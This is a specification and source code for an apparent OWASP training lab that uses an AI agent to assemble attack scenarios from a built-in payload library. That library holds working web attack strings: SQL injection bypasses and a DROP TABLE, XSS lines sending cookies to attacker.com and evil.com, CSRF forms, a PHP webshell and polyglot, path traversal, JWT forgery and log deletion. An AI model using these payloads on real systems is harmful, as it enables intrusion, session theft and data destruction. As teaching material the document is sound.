# AI Scenario Engine — Full Specification

## Overview

Uses **Anthropic Tool Use** to autonomously generate structured attack scenarios.
When a user requests a scenario for a vulnerability type, the agent calls tools
in sequence to build payloads → steps → risk assessment, then returns a
structured `Scenario` the frontend renders as a guided lab.

---

## Flow

```
POST /api/scenarios/generate  { vuln_type, difficulty }
        ↓
scenario_agent.py  →  Anthropic API (claude-sonnet-4-6)
        ↓  agent calls tools in agentic loop
Tool 1: generate_payloads(vuln_type, difficulty, context)
Tool 2: build_attack_steps(vuln_type, target_field, payloads)
Tool 3: analyze_risk(vuln_type, attack_vector, data_exposed)
        ↓
Structured Scenario JSON  →  save to DB  →  return to frontend
```

---

## Tool 1: `generate_payloads`

```python
# FILE: backend/ai_engine/tools/payload_generator.py

TOOL_SPEC = {
    "name": "generate_payloads",
    "description": (
        "Generate a list of attack payloads for a given vulnerability type. "
        "Returns payloads ordered from basic to advanced. "
        "Each payload includes the raw string, what it does, and expected outcome."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "vuln_type": {
                "type": "string",
                "enum": [
                    "sql_injection",
                    "xss",
                    "csrf",
                    "file_upload",
                    "broken_auth",
                    "security_misconfig",
                    "sensitive_data_exposure",
                    "logging_monitoring",
                    "supply_chain",
                    "cryptographic_failure",
                    "insecure_design",
                    "exceptional_conditions",
                    "underprotected_apis"
                ]
            },
            "difficulty": {
                "type": "string",
                "enum": ["beginner", "intermediate", "advanced"]
            },
            "context": {
                "type": "string",
                "description": "Where the payload will be used (e.g. 'login form username field')"
            },
            "count": {
                "type": "integer",
                "minimum": 1,
                "maximum": 10
            }
        },
        "required": ["vuln_type", "difficulty", "context"]
    }
}

# -----------------------------------------------------------------------
# Payload library — agent draws from this when the tool is called
# -----------------------------------------------------------------------
PAYLOADS = {

    "sql_injection": {
        "beginner": [
            {"payload": "' OR '1'='1", "description": "Classic auth bypass",
             "expected": "Login as the first user in DB without a password"},
            {"payload": "' OR '1'='1' --", "description": "Auth bypass with SQL comment",
             "expected": "Password check skipped entirely"},
            {"payload": "admin'--", "description": "Target admin account directly",
             "expected": "Login as admin with no password"},
        ],
        "intermediate": [
            {"payload": "' UNION SELECT null,username,password FROM users--",
             "description": "UNION-based data extraction",
             "expected": "Dump all usernames and password hashes"},
            {"payload": "1' AND SLEEP(5)--", "description": "Time-based blind SQLi",
             "expected": "5-second delay confirms vulnerability"},
        ],
        "advanced": [
            {"payload": "'; DROP TABLE users;--", "description": "Destructive DDL injection",
             "expected": "Destroys the users table"},
            {"payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
             "description": "Error-based table enumeration",
             "expected": "Reveals table names via DB error message"},
        ]
    },

    "xss": {
        "beginner": [
            {"payload": "<script>alert('XSS')</script>", "description": "Basic script injection",
             "expected": "Alert box appears in browser"},
            {"payload": "<img src=x onerror=alert(1)>", "description": "Image error handler",
             "expected": "Alert triggers via broken image load"},
            {"payload": "<svg onload=alert(document.cookie)>", "description": "SVG onload event",
             "expected": "Session cookie exposed in alert"},
        ],
        "intermediate": [
            {"payload": "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
             "description": "Cookie exfiltration",
             "expected": "Session cookie silently sent to attacker server"},
            {"payload": "<script>document.body.innerHTML='<h1>Hacked</h1>'</script>",
             "description": "Page defacement",
             "expected": "Entire page content replaced"},
        ],
        "advanced": [
            {"payload": "<script>new Image().src='//evil.com/log?k='+encodeURIComponent(document.cookie)</script>",
             "description": "Pixel-based exfiltration (bypasses some CSP)",
             "expected": "Cookie sent via image request, harder to detect"},
        ]
    },

    "csrf": {
        "beginner": [
            {"payload": '<form action="http://target/change-password" method="POST">'
                        '<input name="password" value="hacked123">'
                        '</form><script>document.forms[0].submit()</script>',
             "description": "Auto-submitting CSRF form on attacker page",
             "expected": "Victim's password changed silently when they visit attacker page"},
            {"payload": '<img src="http://target/transfer?to=attacker&amount=1000">',
             "description": "GET-based CSRF via image tag",
             "expected": "Fund transfer triggered just by loading attacker's image"},
        ],
        "intermediate": [
            {"payload": "XMLHttpRequest cross-origin POST with victim's active session cookies",
             "description": "AJAX-based CSRF",
             "expected": "Admin action performed under victim's identity"},
        ]
    },

    "file_upload": {
        "beginner": [
            {"payload": "shell.php containing: <?php system($_GET['cmd']); ?>",
             "description": "Basic PHP webshell upload",
             "expected": "Execute OS commands via URL: /uploads/shell.php?cmd=id"},
            {"payload": "evil.php renamed to evil.php.jpg",
             "description": "Double extension bypass",
             "expected": "Bypass naive extension filter, file saved as executable"},
        ],
        "intermediate": [
            {"payload": "GIF89a<?php system($_GET['cmd']); ?>",
             "description": "GIF magic bytes + PHP payload (polyglot file)",
             "expected": "Passes MIME-type check but executes as PHP"},
            {"payload": "shell.phtml / shell.php5 / shell.phar",
             "description": "Alternative PHP extensions",
             "expected": "Bypass .php extension blacklist"},
        ],
        "advanced": [
            {"payload": "SVG file containing <script> tag",
             "description": "SVG XSS via file upload",
             "expected": "Stored XSS triggered when victim views uploaded SVG"},
        ]
    },

    "broken_auth": {
        "beginner": [
            {"payload": "admin / admin  (or admin / password)",
             "description": "Default credentials not changed",
             "expected": "Immediate login to admin account"},
            {"payload": "Brute force with rockyou.txt (no rate limiting)",
             "description": "No login attempt limit",
             "expected": "Correct password found after N attempts without lockout"},
        ],
        "intermediate": [
            {"payload": "Reuse captured session token after user logs out",
             "description": "Session not invalidated on logout",
             "expected": "Attacker can still authenticate with old token"},
            {"payload": "Credential stuffing: leaked username:password list from other breach",
             "description": "Password reuse across services",
             "expected": "Accounts with reused passwords compromised"},
        ],
        "advanced": [
            {"payload": "Tamper JWT payload: change role from 'user' to 'admin', re-sign with 'none' algorithm",
             "description": "JWT algorithm confusion (none alg attack)",
             "expected": "Admin access granted without valid signature"},
        ]
    },

    "security_misconfig": {
        "beginner": [
            {"payload": "GET /.env",
             "description": "Exposed environment file",
             "expected": "DB credentials, API keys, SECRET_KEY all exposed"},
            {"payload": "GET /.git/config",
             "description": "Exposed git repository config",
             "expected": "Remote repo URL and potentially credentials visible"},
            {"payload": "GET /admin/ with a regular user account",
             "description": "Missing access control on admin panel",
             "expected": "Full admin dashboard accessible without admin role"},
        ],
        "intermediate": [
            {"payload": "GET /phpmyadmin/  (or /adminer.php)",
             "description": "DB admin tool exposed to internet",
             "expected": "Direct database access without app-layer auth"},
            {"payload": "Error page stack trace: trigger 500 with invalid input",
             "description": "Verbose error messages enabled in production",
             "expected": "Framework version, file paths, DB schema revealed"},
        ],
        "advanced": [
            {"payload": "Directory traversal: GET /static/../../../../etc/passwd",
             "description": "Path traversal due to misconfigured static file serving",
             "expected": "System file contents returned"},
        ]
    },

    "sensitive_data_exposure": {
        "beginner": [
            {"payload": "Intercept HTTP (non-HTTPS) login form with Wireshark / mitmproxy",
             "description": "Credentials transmitted in plaintext",
             "expected": "Username and password captured in clear text on network"},
            {"payload": "SELECT password FROM users — observe plain text storage",
             "description": "Passwords stored without hashing",
             "expected": "All user passwords immediately readable from DB dump"},
        ],
        "intermediate": [
            {"payload": "Access old database backup: GET /backup/db_2023.sql",
             "description": "Unprotected backup files",
             "expected": "Full database with all user credentials downloaded"},
            {"payload": "Check API response for over-exposed fields (SSN, full card number)",
             "description": "API returning more fields than needed",
             "expected": "Sensitive PII returned in JSON response unnecessarily"},
        ]
    },

    "logging_monitoring": {
        "beginner": [
            {"payload": "Perform 100 failed logins — observe: no alert, no lockout, no log entry",
             "description": "No brute force detection or alerting",
             "expected": "Attack proceeds undetected; no incident created"},
            {"payload": "SQLi payload in login — check: does log record the raw payload?",
             "description": "Logs don't capture attack payloads",
             "expected": "Attack leaves no forensic trail for incident response"},
        ],
        "intermediate": [
            {"payload": "Delete or modify log file: rm /var/log/app/access.log",
             "description": "Logs stored without integrity protection",
             "expected": "Attacker can erase evidence of intrusion"},
        ]
    },

    "supply_chain": {
        "beginner": [
            {"payload": "npm install malicious-package (typosquatting: 'lodahs' vs 'lodash')",
             "description": "Typosquatted package on npm",
             "expected": "Malicious code installed alongside app dependencies"},
            {"payload": "pip install colourama  (vs 'colorama')",
             "description": "Typosquatted PyPI package",
             "expected": "Credential-stealing code injected into Python environment"},
        ],
        "intermediate": [
            {"payload": "Use outdated library with known CVE (e.g. requests < 2.20.0 — CVE-2018-18074)",
             "description": "Dependency with published CVE",
             "expected": "Vulnerability inherited from unmaintained dependency"},
        ],
        "advanced": [
            {"payload": "CI/CD pipeline injects env var exfiltration step via compromised build script",
             "description": "Build pipeline compromise",
             "expected": "ANTHROPIC_API_KEY and DATABASE_URL exfiltrated during build"},
        ]
    },

    "cryptographic_failure": {
        "beginner": [
            {"payload": "Crack MD5 hash via online rainbow table: 5f4dcc3b5aa765d61d8327deb882cf99",
             "description": "Weak MD5 hash — instantly cracked",
             "expected": "Plain text 'password' recovered in under 1 second"},
            {"payload": "Connect to app over plain HTTP, intercept with mitmproxy",
             "description": "No TLS / HTTPS enforcement",
             "expected": "All data including session tokens captured in transit"},
        ],
        "intermediate": [
            {"payload": "Decode JWT secret brute-forced with jwt_tool / hashcat (weak secret key)",
             "description": "JWT signed with weak secret ('secret', '123456')",
             "expected": "JWT forged to escalate privileges"},
            {"payload": "SSL Labs scan: server supports TLS 1.0 / SSLv3",
             "description": "Outdated TLS version enabled",
             "expected": "POODLE or BEAST downgrade attack possible"},
        ]
    },

    "insecure_design": {
        "beginner": [
            {"payload": "Password reset: answer security question 'mother's maiden name' using public LinkedIn data",
             "description": "Guessable security questions",
             "expected": "Account takeover using publicly available personal info"},
            {"payload": "Enumerate user IDs: GET /api/users/1, /2, /3 with regular user token",
             "description": "No object-level authorization check (IDOR)",
             "expected": "All user profiles accessible without ownership check"},
        ],
        "intermediate": [
            {"payload": "Abuse coupon logic: apply same promo code 100 times in parallel (race condition)",
             "description": "Business logic flaw — no idempotency check",
             "expected": "Discount applied multiple times due to race condition"},
        ]
    },

    "exceptional_conditions": {
        "beginner": [
            {"payload": "Submit 100,000-character string in comment field",
             "description": "No input length validation",
             "expected": "Server 500 error leaks stack trace with internal paths"},
            {"payload": "Send malformed JSON: {username: } to /api/login",
             "description": "No input format validation",
             "expected": "Unhandled exception reveals framework details"},
        ],
        "intermediate": [
            {"payload": "Send concurrent transfer requests (race condition): POST /transfer x 10 simultaneously",
             "description": "Missing transaction atomicity / mutex lock",
             "expected": "Balance debited once but credited multiple times (or vice versa)"},
            {"payload": "Upload file, then immediately DELETE it mid-processing (TOCTOU attack)",
             "description": "Time-of-check to time-of-use race",
             "expected": "Processing continues on deleted file path, causing undefined behavior"},
        ]
    },

    "underprotected_apis": {
        "beginner": [
            {"payload": "Call /api/admin/users without Authorization header",
             "description": "Unauthenticated API endpoint",
             "expected": "Full user list returned with no auth required"},
            {"payload": "GET /api/v1/export?format=../../../etc/passwd",
             "description": "API path traversal",
             "expected": "System files returned via export endpoint"},
        ],
        "intermediate": [
            {"payload": "POST /api/update-role with body {role: 'admin'} as regular user",
             "description": "Missing server-side role authorization",
             "expected": "Own role escalated to admin"},
            {"payload": "Replay captured API token after expiry (server does not validate exp claim)",
             "description": "Expired token accepted",
             "expected": "Old stolen token still authenticates successfully"},
        ]
    }
}


async def execute(input: dict) -> dict:
    vuln_type = input["vuln_type"]
    difficulty = input.get("difficulty", "beginner")
    context = input["context"]
    count = input.get("count", 3)
    payloads = PAYLOADS.get(vuln_type, {}).get(difficulty, [])[:count]
    return {
        "vuln_type": vuln_type,
        "difficulty": difficulty,
        "context": context,
        "payloads": payloads
    }
```

---

## Tool 2: `build_attack_steps`

```python
# FILE: backend/ai_engine/tools/scenario_builder.py

TOOL_SPEC = {
    "name": "build_attack_steps",
    "description": (
        "Build a numbered step-by-step attack narrative for a vulnerability scenario. "
        "Steps guide a learner through reconnaissance, exploitation, and impact."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "vuln_type": {"type": "string"},
            "target_field": {
                "type": "string",
                "description": "The specific UI field or endpoint (e.g. 'username field on /login')"
            },
            "payloads": {
                "type": "array",
                "items": {"type": "string"},
                "description": "Payload strings to incorporate into the steps"
            },
            "include_defense": {
                "type": "boolean",
                "description": "Include mitigation steps after the attack walkthrough"
            }
        },
        "required": ["vuln_type", "target_field", "payloads"]
    }
}


async def execute(input: dict) -> dict:
    """
    Returns a structured step list for the given vulnerability.
    The AI agent writes the actual narrative text; this provides the skeleton.
    """
    vuln_type = input["vuln_type"]
    target = input["target_field"]
    payloads = input.get("payloads", [])
    include_defense = input.get("include_defense", True)

    base_steps = [
        {"step": 1, "phase": "Reconnaissance",
         "title": f"Identify the target: {target}",
         "description": f"Observe the {target} and determine it accepts user input."},
        {"step": 2, "phase": "Probe",
         "title": "Test with a benign probe",
         "description": "Enter a simple value to confirm the field is functional."},
        {"step": 3, "phase": "Exploit",
         "title": "Inject the attack payload",
         "description": f"Enter payload: {payloads[0] if payloads else 'N/A'}"},
        {"step": 4, "phase": "Impact",
         "title": "Observe and document the outcome",
         "description": "Confirm that the exploit succeeded and record the result."},
    ]

    if include_defense:
        base_steps.append({
            "step": 5, "phase": "Defense",
            "title": "Switch to Secure Mode and repeat",
            "description": "Toggle Security Mode ON and retry the same payload — observe it is blocked."
        })

    return {
        "vuln_type": vuln_type,
        "target_field": target,
        "steps": base_steps
    }
```

---

## Tool 3: `analyze_risk`

```python
# FILE: backend/ai_engine/tools/risk_analyzer.py

TOOL_SPEC = {
    "name": "analyze_risk",
    "description": (
        "Calculate a CVSS-style risk score and structured risk analysis "
        "for a vulnerability in context."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "vuln_type": {"type": "string"},
            "attack_vector": {
                "type": "string",
                "enum": ["network", "adjacent", "local", "physical"]
            },
            "authentication_required": {"type": "boolean"},
            "data_exposed": {
                "type": "array",
                "items": {"type": "string"},
                "description": "e.g. ['credentials', 'PII', 'session tokens', 'source code']"
            }
        },
        "required": ["vuln_type", "attack_vector"]
    }
}

# Base CVSS scores per vulnerability type (approximations for educational use)
BASE_SCORES = {
    "sql_injection":           {"score": 9.8, "severity": "Critical"},
    "xss":                     {"score": 7.4, "severity": "High"},
    "csrf":                    {"score": 6.5, "severity": "Medium"},
    "file_upload":             {"score": 9.0, "severity": "Critical"},
    "broken_auth":             {"score": 8.8, "severity": "High"},
    "security_misconfig":      {"score": 7.5, "severity": "High"},
    "sensitive_data_exposure": {"score": 7.5, "severity": "High"},
    "logging_monitoring":      {"score": 4.0, "severity": "Medium"},
    "supply_chain":            {"score": 9.0, "severity": "Critical"},
    "cryptographic_failure":   {"score": 7.5, "severity": "High"},
    "insecure_design":         {"score": 8.0, "severity": "High"},
    "exceptional_conditions":  {"score": 5.5, "severity": "Medium"},
    "underprotected_apis":     {"score": 8.6, "severity": "High"},
}

OWASP_MAPPING = {
    "sql_injection":           "A03:2021 – Injection",
    "xss":                     "A03:2021 – Injection (XSS)",
    "csrf":                    "A01:2021 – Broken Access Control",
    "file_upload":             "A04:2021 – Insecure Design / A08 – Security Failures",
    "broken_auth":             "A07:2021 – Identification and Authentication Failures",
    "security_misconfig":      "A05:2021 – Security Misconfiguration",
    "sensitive_data_exposure": "A02:2021 – Cryptographic Failures",
    "logging_monitoring":      "A09:2021 – Security Logging and Monitoring Failures",
    "supply_chain":            "A06:2021 – Vulnerable and Outdated Components",
    "cryptographic_failure":   "A02:2021 – Cryptographic Failures",
    "insecure_design":         "A04:2021 – Insecure Design",
    "exceptional_conditions":  "A04:2021 – Insecure Design",
    "underprotected_apis":     "A01:2021 – Broken Access Control",
}


async def execute(input: dict) -> dict:
    vuln_type = input["vuln_type"]
    attack_vector = input.get("attack_vector", "network")
    auth_required = input.get("authentication_required", False)
    data_exposed = input.get("data_exposed", [])

    base = BASE_SCORES.get(vuln_type, {"score": 5.0, "severity": "Medium"})
    score = base["score"]
    if auth_required:
        score = max(score - 1.5, 0)
    if attack_vector != "network":
        score = max(score - 1.0, 0)

    return {
        "cvss_score": round(score, 1),
        "severity": base["severity"],
        "owasp_category": OWASP_MAPPING.get(vuln_type, "OWASP Top 10"),
        "attack_vector": attack_vector,
        "authentication_required": auth_required,
        "data_at_risk": data_exposed,
        "impact_summary": (
            f"Exploiting {vuln_type.replace('_', ' ').title()} via {attack_vector} vector "
            f"can expose: {', '.join(data_exposed) if data_exposed else 'system integrity'}. "
            f"CVSS base score: {round(score, 1)} ({base['severity']})."
        )
    }
```

---

## Agent Loop

```python
# FILE: backend/ai_engine/scenario_agent.py

import anthropic
import json
import re
from typing import Any

from .tools.payload_generator import TOOL_SPEC as PAYLOAD_SPEC, execute as run_payloads
from .tools.scenario_builder import TOOL_SPEC as STEPS_SPEC,   execute as run_steps
from .tools.risk_analyzer    import TOOL_SPEC as RISK_SPEC,    execute as run_risk

client = anthropic.AsyncAnthropic()

ALL_TOOLS = [PAYLOAD_SPEC, STEPS_SPEC, RISK_SPEC]

EXECUTORS = {
    "generate_payloads":  run_payloads,
    "build_attack_steps": run_steps,
    "analyze_risk":       run_risk,
}

SYSTEM_PROMPT = """You are a cybersecurity education assistant creating structured lab 
scenarios for OWASP Top 10 training.

When asked to generate a scenario:
1. Call generate_payloads to get relevant attack payloads
2. Call build_attack_steps to build a step-by-step attack guide
3. Call analyze_risk to add a CVSS risk assessment
4. Return ONLY a JSON object (no markdown fences) with this exact shape:

{
  "title": "...",
  "vuln_type": "...",
  "description": "2-3 sentence summary of what this vulnerability is and why it matters",
  "difficulty": "beginner|intermediate|advanced",
  "steps": [{"step":1,"phase":"...","title":"...","description":"...","payload":"..."}],
  "payloads": [{"payload":"...","description":"...","expected_outcome":"..."}],
  "risk": {"cvss_score":0.0,"severity":"...","owasp_category":"...","impact_summary":"..."},
  "defense_tips": ["tip1","tip2","tip3"],
  "code_examples": {
    "vulnerable": "// vulnerable code snippet",
    "secure": "// secure code snippet"
  }
}

Always call all three tools before writing the final JSON.
"""


async def generate_scenario(vuln_type: str, difficulty: str = "beginner") -> dict[str, Any]:
    messages: list[dict] = [
        {
            "role": "user",
            "content": (
                f"Generate a complete lab scenario for vulnerability: '{vuln_type}' "
                f"at '{difficulty}' difficulty. "
                f"Target the demo app's login form, comment field, and file upload. "
                f"Call all three tools, then return the final JSON."
            )
        }
    ]

    for _ in range(8):  # safety cap on iterations
        response = await client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=4000,
            system=SYSTEM_PROMPT,
            tools=ALL_TOOLS,
            messages=messages,
        )

        messages.append({"role": "assistant", "content": response.content})

        if response.stop_reason == "end_turn":
            for block in response.content:
                if block.type == "text":
                    text = block.text.strip()
                    # Strip markdown fences if present
                    text = re.sub(r"^```json\s*", "", text)
                    text = re.sub(r"\s*```$", "", text)
                    try:
                        return json.loads(text)
                    except json.JSONDecodeError:
                        # Try to extract JSON object from text
                        match = re.search(r"\{.*\}", text, re.DOTALL)
                        if match:
                            return json.loads(match.group())
            raise ValueError("Agent returned end_turn but no valid JSON found")

        if response.stop_reason == "tool_use":
            tool_results = []
            for block in response.content:
                if block.type == "tool_use":
                    executor = EXECUTORS.get(block.name)
                    if executor:
                        result = await executor(block.input)
                        tool_results.append({
                            "type": "tool_result",
                            "tool_use_id": block.id,
                            "content": json.dumps(result)
                        })
            messages.append({"role": "user", "content": tool_results})

    raise RuntimeError("Agent loop exceeded maximum iterations")
```

---

## API Router

```python
# FILE: backend/routers/scenarios.py

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from sqlalchemy import select
from ..database import AsyncSessionLocal
from ..models.scenario import Scenario as ScenarioModel
from ..ai_engine.scenario_agent import generate_scenario

router = APIRouter(prefix="/api/scenarios", tags=["scenarios"])

ALLOWED_VULN_TYPES = {
    "sql_injection", "xss", "csrf", "file_upload", "broken_auth",
    "security_misconfig", "sensitive_data_exposure", "logging_monitoring",
    "supply_chain", "cryptographic_failure", "insecure_design",
    "exceptional_conditions", "underprotected_apis"
}

class ScenarioRequest(BaseModel):
    vuln_type: str
    difficulty: str = "beginner"


@router.post("/generate")
async def create_scenario(req: ScenarioRequest):
    if req.vuln_type not in ALLOWED_VULN_TYPES:
        raise HTTPException(400, f"Unknown vuln_type: {req.vuln_type}")
    try:
        data = await generate_scenario(req.vuln_type, req.difficulty)
        async with AsyncSessionLocal() as session:
            db_obj = ScenarioModel(
                vuln_type=req.vuln_type,
                title=data.get("title"),
                steps=data.get("steps"),
                payloads=data.get("payloads"),
                cvss_score=data.get("risk", {}).get("cvss_score"),
            )
            session.add(db_obj)
            await session.commit()
            await session.refresh(db_obj)
        return {"id": db_obj.id, **data}
    except Exception as e:
        raise HTTPException(500, str(e))


@router.get("/")
async def list_scenarios():
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(ScenarioModel).order_by(ScenarioModel.generated_at.desc())
        )
        return result.scalars().all()


@router.get("/{scenario_id}")
async def get_scenario(scenario_id: int):
    async with AsyncSessionLocal() as session:
        obj = await session.get(ScenarioModel, scenario_id)
        if not obj:
            raise HTTPException(404, "Scenario not found")
        return obj
```

---

## Angular Scenario Service

```typescript
// FILE: frontend/src/app/core/services/scenario.service.ts

import { Injectable, inject } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable } from 'rxjs';
import { environment } from '../../../environments/environment';

export type VulnType =
  | 'sql_injection' | 'xss' | 'csrf' | 'file_upload' | 'broken_auth'
  | 'security_misconfig' | 'sensitive_data_exposure' | 'logging_monitoring'
  | 'supply_chain' | 'cryptographic_failure' | 'insecure_design'
  | 'exceptional_conditions' | 'underprotected_apis';

export interface ScenarioStep {
  step: number;
  phase: string;
  title: string;
  description: string;
  payload?: string;
}

export interface Scenario {
  id?: number;
  title: string;
  vuln_type: VulnType;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  steps: ScenarioStep[];
  payloads: Array<{ payload: string; description: string; expected_outcome: string }>;
  risk: { cvss_score: number; severity: string; owasp_category: string; impact_summary: string };
  defense_tips: string[];
  code_examples: { vulnerable: string; secure: string };
}

@Injectable({ providedIn: 'root' })
export class ScenarioService {
  private http = inject(HttpClient);

  readonly VULN_TYPES: Array<{ id: VulnType; label: string }> = [
    { id: 'sql_injection',           label: 'SQL Injection' },
    { id: 'xss',                     label: 'Cross-Site Scripting (XSS)' },
    { id: 'csrf',                    label: 'CSRF' },
    { id: 'file_upload',             label: 'Malicious File Upload' },
    { id: 'broken_auth',             label: 'Broken Authentication' },
    { id: 'security_misconfig',      label: 'Security Misconfiguration' },
    { id: 'sensitive_data_exposure', label: 'Sensitive Data Exposure' },
    { id: 'logging_monitoring',      label: 'Insufficient Logging & Monitoring' },
    { id: 'supply_chain',            label: 'Software Supply Chain Failures' },
    { id: 'cryptographic_failure',   label: 'Cryptographic Failures' },
    { id: 'insecure_design',         label: 'Insecure Design' },
    { id: 'exceptional_conditions',  label: 'Mishandling Exceptional Conditions' },
    { id: 'underprotected_apis',     label: 'Underprotected APIs' },
  ];

  generate(vulnType: VulnType, difficulty = 'beginner'): Observable<Scenario> {
    return this.http.post<Scenario>(`${environment.apiUrl}/scenarios/generate`, {
      vuln_type: vulnType,
      difficulty,
    });
  }

  list(): Observable<Scenario[]> {
    return this.http.get<Scenario[]>(`${environment.apiUrl}/scenarios/`);
  }

  get(id: number): Observable<Scenario> {
    return this.http.get<Scenario>(`${environment.apiUrl}/scenarios/${id}`);
  }
}
```
